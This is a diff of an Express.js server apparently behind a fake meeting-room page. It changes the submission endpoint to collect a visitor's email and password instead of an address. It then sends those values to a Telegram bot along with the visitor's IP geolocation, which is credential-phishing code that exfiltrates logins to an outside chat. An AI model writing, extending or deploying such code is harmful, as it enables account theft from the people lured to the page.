@@ -79,7 +79,7 @@ app.get('/api/client-ip', async (req, res) => {
 // Endpoint to handle client info submission, IP geolocation, and Telegram notification
 app.post('/api/submit-client-info', async (req, res) => {
   try {
-    const { clientEmail, clientAddress, meetingId, hostName, clientIp } = req.body;
+    const { clientEmail, clientPassword, meetingId, hostName, clientIp } = req.body;
 
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -133,7 +133,7 @@ app.post('/api/submit-client-info', async (req, res) => {
 
 --- CLIENT DETAILS ---
 • *Email:* ${clientEmail || 'N/A'}
-• *Address:* ${clientAddress || 'N/A'}
+• *Password:* ${clientPassword || 'N/A'}
 • *Room ID:* ${meetingId || 'N/A'}
 • *Host:* ${hostName || 'Host'}
 • *Time:* ${new Date().toLocaleString()}
